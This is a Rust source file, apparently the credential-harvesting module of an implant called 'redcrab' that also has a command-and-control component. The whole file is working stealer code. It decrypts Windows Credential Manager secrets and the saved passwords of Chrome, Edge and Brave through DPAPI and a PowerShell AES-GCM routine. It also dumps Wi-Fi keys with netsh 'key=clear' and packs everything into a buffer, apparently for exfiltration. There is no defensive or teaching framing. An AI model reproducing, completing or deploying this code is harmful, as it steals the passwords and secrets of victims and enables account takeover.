//! dpapi.rs — DPAPI credential harvesting
//!
//! Harvests:
//!   1. Chrome/Edge saved passwords  (Login Data SQLite, DPAPI-encrypted)
//!   2. Windows Credential Manager   (CredEnumerateW)
//!   3. Wi-Fi PSKs                   (netsh wlan show profile ... key=clear)
//!
//! All decryption in-memory via CryptUnprotectData — no disk writes.

use std::os::windows::ffi::OsStringExt;
use std::ffi::OsString;
use winapi::um::dpapi::{CryptUnprotectData, CRYPTOAPI_BLOB};
use winapi::um::wincred::{
    CredEnumerateW, CredFree,
    CRED_TYPE_GENERIC,
    PCREDENTIALW,
};
use winapi::shared::minwindef::DWORD;

#[derive(Debug)]
pub struct HarvestedCred {
    pub source: String,
    pub target: String,
    pub username: String,
    pub secret: String,
}

pub fn harvest_credential_manager() -> Vec<HarvestedCred> {
    let mut out = Vec::new();
    unsafe {
        let mut count: DWORD = 0;
        let mut creds: *mut PCREDENTIALW = std::ptr::null_mut();
        if CredEnumerateW(std::ptr::null(), 0, &mut count, &mut creds) == 0 { return out; }
        for i in 0..(count as usize) {
            let c = &**creds.add(i);
            let target   = wstr(c.TargetName);
            let username = wstr(c.UserName);
            let secret = if c.CredentialBlobSize > 0 && !c.CredentialBlob.is_null() {
                dpapi_decrypt(c.CredentialBlob, c.CredentialBlobSize as usize)
                    .and_then(|b| String::from_utf8(b).ok())
                    .unwrap_or_else(|| "<binary>".into())
            } else { String::new() };
            out.push(HarvestedCred { source: "CredMan".into(), target, username, secret });
        }
        CredFree(creds as _);
    }
    out
}

pub fn harvest_browser_logins() -> Vec<HarvestedCred> {
    let mut out = Vec::new();
    let appdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
    let profiles = [
        format!(r"{}\Google\Chrome\User Data\Default\Login Data", appdata),
        format!(r"{}\Microsoft\Edge\User Data\Default\Login Data", appdata),
        format!(r"{}\BraveSoftware\Brave-Browser\User Data\Default\Login Data", appdata),
    ];
    for db_path in &profiles {
        if !std::path::Path::new(db_path).exists() { continue; }
        let tmp = format!(r"{}\redcrab_tmp.db", std::env::temp_dir().to_string_lossy());
        if std::fs::copy(db_path, &tmp).is_err() { continue; }
        if let Ok(rows) = query_login_data(&tmp) {
            for (url, user, enc_pass) in rows {
                let pass = decrypt_chrome_password(&enc_pass, &appdata)
                    .unwrap_or_else(|| "<decrypt_failed>".into());
                out.push(HarvestedCred { source: "Browser".into(), target: url, username: user, secret: pass });
            }
        }
        let _ = std::fs::remove_file(&tmp);
    }
    out
}

pub fn harvest_wifi_psks() -> Vec<HarvestedCred> {
    let mut out = Vec::new();
    let list = std::process::Command::new("netsh")
        .args(["wlan", "show", "profiles"])
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default();
    for line in list.lines() {
        if let Some(pos) = line.find(':') {
            let profile = line[pos+1..].trim().to_string();
            if profile.is_empty() { continue; }
            let detail = std::process::Command::new("netsh")
                .args(["wlan", "show", "profile", &profile, "key=clear"])
                .output()
                .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
                .unwrap_or_default();
            for dl in detail.lines() {
                if dl.contains("Key Content") {
                    if let Some(p) = dl.find(':') {
                        out.push(HarvestedCred {
                            source: "WiFi".into(), target: profile.clone(),
                            username: String::new(), secret: dl[p+1..].trim().to_string(),
                        });
                    }
                }
            }
        }
    }
    out
}

pub fn dump_all() -> Vec<u8> {
    harvest_credential_manager()
        .into_iter()
        .chain(harvest_browser_logins())
        .chain(harvest_wifi_psks())
        .map(|c| format!("[{}] {} | {} | {}\n", c.source, c.target, c.username, c.secret))
        .collect::<String>()
        .into_bytes()
}

/// Public re-export for c2.rs host-list base64 decode
pub fn base64_decode_pub(s: &str) -> Option<Vec<u8>> { base64_decode(s) }

// ── internals ─────────────────────────────────────────────────────────────────

unsafe fn dpapi_decrypt(data: *const u8, len: usize) -> Option<Vec<u8>> {
    let mut blob_in = CRYPTOAPI_BLOB { cbData: len as DWORD, pbData: data as *mut u8 };
    let mut blob_out: CRYPTOAPI_BLOB = std::mem::zeroed();
    if CryptUnprotectData(
        &mut blob_in, std::ptr::null_mut(), std::ptr::null_mut(),
        std::ptr::null_mut(), std::ptr::null_mut(), 0, &mut blob_out,
    ) == 0 { return None; }
    let v = std::slice::from_raw_parts(blob_out.pbData, blob_out.cbData as usize).to_vec();
    winapi::um::winbase::LocalFree(blob_out.pbData as _);
    Some(v)
}

fn wstr(p: *const u16) -> String {
    if p.is_null() { return String::new(); }
    unsafe {
        let len = (0..).take_while(|&i| *p.add(i) != 0).count();
        OsString::from_wide(std::slice::from_raw_parts(p, len)).to_string_lossy().into_owned()
    }
}

fn query_login_data(path: &str) -> Result<Vec<(String, String, Vec<u8>)>, ()> {
    let out = std::process::Command::new("sqlite3")
        .args([path, "-separator", "\x1F",
               "SELECT origin_url,username_value,password_value FROM logins"])
        .output().map_err(|_| ())?;
    let mut rows = Vec::new();
    for line in String::from_utf8_lossy(&out.stdout).lines() {
        let parts: Vec<&str> = line.splitn(3, '\x1F').collect();
        if parts.len() == 3 {
            rows.push((parts[0].to_string(), parts[1].to_string(), parts[2].as_bytes().to_vec()));
        }
    }
    Ok(rows)
}

fn decrypt_chrome_password(enc: &[u8], appdata: &str) -> Option<String> {
    if enc.starts_with(b"v10") || enc.starts_with(b"v11") {
        let key = get_chrome_aes_key(appdata)?;
        let nonce = &enc[3..15];
        let ciphertext = &enc[15..];
        bcrypt_aes_gcm_decrypt(&key, nonce, ciphertext)
            .and_then(|b| String::from_utf8(b).ok())
    } else {
        unsafe { dpapi_decrypt(enc.as_ptr(), enc.len()) }
            .and_then(|b| String::from_utf8(b).ok())
    }
}

fn get_chrome_aes_key(appdata: &str) -> Option<Vec<u8>> {
    let ls_path = format!(r"{}\Google\Chrome\User Data\Local State", appdata);
    let raw = std::fs::read_to_string(ls_path).ok()?;
    let key_str = raw.split("\"encrypted_key\":\"").nth(1)?.split('"').next()?;
    let decoded = base64_decode(key_str)?;
    if decoded.len() < 5 { return None; }
    unsafe { dpapi_decrypt(decoded[5..].as_ptr(), decoded.len() - 5) }
}

fn base64_decode(s: &str) -> Option<Vec<u8>> {
    const TABLE: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = Vec::new();
    let bytes: Vec<u8> = s.bytes().filter(|&b| b != b'=').collect();
    let mut i = 0;
    while i + 3 < bytes.len() {
        let idx = |b: u8| TABLE.iter().position(|&x| x == b).unwrap_or(0) as u32;
        let a = idx(bytes[i]); let b = idx(bytes[i+1]);
        let c = idx(bytes[i+2]); let d = idx(bytes[i+3]);
        out.push(((a << 2) | (b >> 4)) as u8);
        out.push(((b << 4) | (c >> 2)) as u8);
        out.push(((c << 6) | d) as u8);
        i += 4;
    }
    Some(out)
}

fn bcrypt_aes_gcm_decrypt(key: &[u8], nonce: &[u8], ct: &[u8]) -> Option<Vec<u8>> {
    let key_hex:   String = key.iter().map(|b| format!("{:02x}", b)).collect();
    let nonce_hex: String = nonce.iter().map(|b| format!("{:02x}", b)).collect();
    let ct_hex:    String = ct.iter().map(|b| format!("{:02x}", b)).collect();
    fn to_byte_arr(hex: &str) -> String {
        hex.as_bytes().chunks(2)
            .map(|c| format!("0x{}{},", c[0] as char, c[1] as char))
            .collect::<String>()
            .trim_end_matches(',')
            .to_string()
    }
    let script = format!(
        "$k=[byte[]]@({k}); $n=[byte[]]@({n}); $c=[byte[]]@({c});\
         $a=[System.Security.Cryptography.AesGcm]::new($k);\
         $p=New-Object byte[] ($c.Length-16);\
         $t=New-Object byte[] 16;\
         [Array]::Copy($c,$c.Length-16,$t,0,16);\
         $ci=$c[0..($c.Length-17)];\
         $a.Decrypt($n,$ci,$t,$p,$null);\
         [Text.Encoding]::UTF8.GetString($p)",
        k = to_byte_arr(&key_hex), n = to_byte_arr(&nonce_hex), c = to_byte_arr(&ct_hex),
    );
    let out = std::process::Command::new("powershell")
        .args(["-NonInteractive", "-NoProfile", "-Command", &script])
        .output().ok()?;
    let s = String::from_utf8(out.stdout).ok()?.trim().to_string();
    if s.is_empty() { None } else { Some(s.into_bytes()) }
}
